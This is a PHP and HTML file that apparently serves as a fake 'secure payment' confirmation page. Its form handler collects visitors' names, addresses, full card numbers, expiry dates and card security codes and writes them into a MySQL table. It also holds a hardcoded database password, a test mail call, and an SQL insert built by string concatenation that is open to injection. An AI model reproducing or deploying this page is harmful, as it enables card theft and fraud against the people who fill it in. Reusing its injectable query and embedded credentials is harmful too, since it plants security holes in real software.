<?php
 $to = "mvaqasuddin@gmail.com";
 $subject = "Hi!";
 $body = "Hi,\n\nHow are you?";
 if (mail($to, $subject, $body)) {
   echo("<p>Message successfully sent!</p>");
  } else {
   echo("<p>Message delivery failed...</p>");
  }
   die();
 ?>

<?php

$conn = mysql_connect('localhost','mywritin_test','2Ln@zU#~Khr;') or die(mysql_error());
$database = mysql_select_db('mywritin_database',$conn) or die( mysql_error() );
if (isset($_POST['submit']) ){
	$firstname = $_POST['firstname'];
	$lastname = $_POST['lastname'];
	$email = $_POST['email'];
	$address = $_POST['address'];
	$city = $_POST['city'];
	$state = $_POST['state'];
	$zipcode = $_POST['zipcode'];
	$country =$_POST['country'];
	$cardnumber = $_POST['cardnumber'];
	$expiry = $_POST['expiry'];
	$expirymonth = $_POST['expirymonth'];
	$securitycode = $_POST['securitycode'];
	
	$sql = "INSERT INTO information (firstname,lastname,email,address,city,state,zipcode,country,cardnumber,expiry,expirymonth,securitycode) VALUES ('$firstname','$lastname','$email','$address','$city','$state','$zipcode','$country','$cardnumber','$expiry','$expirymonth','$securitycode')";
	$result = mysql_query($sql);
}

?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0074)https://www.mywritingjob.com/payment.php?first_form_email_id=asdas@hot.com -->
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="keywords" content="">
<meta name="description" content="">
<title>Congratulation</title>
<!-- css stylesheets -->
<link rel="stylesheet" href="Css/style.css" type="text/css" media="all">

<!-- main file -->
<link rel="stylesheet" href="Css/theme_default3.css" type="text/css" media="all">
<!-- theme file - can be changed -->
<link rel="stylesheet" href="Css/prettyPhoto.css" type="text/css" media="screen" charset="utf-8">
<!-- prettyPhoto plugin stylesheet -->
<link rel="stylesheet" href="Css/WOAHbar.css" type="text/css" media="all">
<link href="https://fonts.googleapis.com/css?family=Open+Sans:light,lightitalic,regular,regularitalic,600,600italic,bold,bolditalic,800,800italic" rel="stylesheet">
<link href="Css/accordion-a.css" rel="stylesheet">
<link href="Css/minimal.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="Css/common.css">
<link rel="stylesheet" href="Css/style2.css">
<link href="Css/newTemplateForm.css" rel="stylesheet" type="text/css">
<link href="Css/pay.css" rel="stylesheet" type="text/css">
<!--
<style type="text/css">
.customFooter {
	font-size: 7pt;
	color:  #000000;
	background-color: #FFFFFF;
}
</style>
<style type="text/css">

input {color: #000000; font-size: 11px; font-family: Verdana;}

select {color: #000000; font-size: 11px; font-family: Verdana;}

.updateBtn{ no-repeat scroll 0%;border:medium none;border-collapse:collapse;cursor:pointer;width:20px;height:20px;vertical-align:top;}

.icon{border: none; cursor:pointer; width:16px; height:16px; vertical-align:top; }

/*.info {background:transparent url(/images/wizard1.png) no-repeat scroll 0px -543px;cursor:pointer;cursor:hand;}*/

</style>
<style title="plimusBuynowSheet" media="screen" type="text/css">
</style>
<style>
    #errorText {
	color:#F00;
	font-size:14px;
}
</style>
-->

<link type="text/css" href="Css/jquery-ui.css" rel="Stylesheet">
<script type="text/javascript" src="JS/jquery.min.js"></script>
<script type="text/javascript" src="JS/jquery-ui.min(1).js"></script>
<script type="text/javascript">var dep = false;</script>
<script type="text/javascript" src="JS/jquery.validationEngine-en-US.js"></script>
<script type="text/javascript" src="JS/jquery.validationEngine.js"></script>
<link rel="stylesheet" href="Css/validationEngine.jquery.css" type="text/css" media="all">

</head>
<body>
<div class="fixwidth">
	<!--main dive-->
	
	<div class="maindiv">
	
		<table class="logo_tel">
			<tbody><tr>
				<td>
					<a href="#"><img src="images/logo.png" style="padding-bottom:30px" width="330" height="49" alt=""></a>
				</td>
        		<td><div id="lock">
            			<p>Secure Payment Website for: <strong>mywritingjob.us</strong></p>
          			</div>
					
				</td>
			</tr>
		</tbody></table>
		<div id="mainContent">
		    
		<!--	<div style="margin: -105px auto 0pt;" align="center"> -->
		<center>
		<div class="congfont1">
			 		
					
			
			  	
		
					CONGRATULATIONS..!!!
					
					<br><br><br><br><br>
					<div class="congfont2">
					Your account has been register. You will be get your confirmation mail within 24 hours through your bank.
					</div>
					<br><br>
					<div class="congfont3">
					Thanks you for your patience
					</div>

		     </div></center>
		</div>
		
	
		
	</div>
	<!--footer dive-->
	<div class="footer">
	</div>
</div>


</body></html>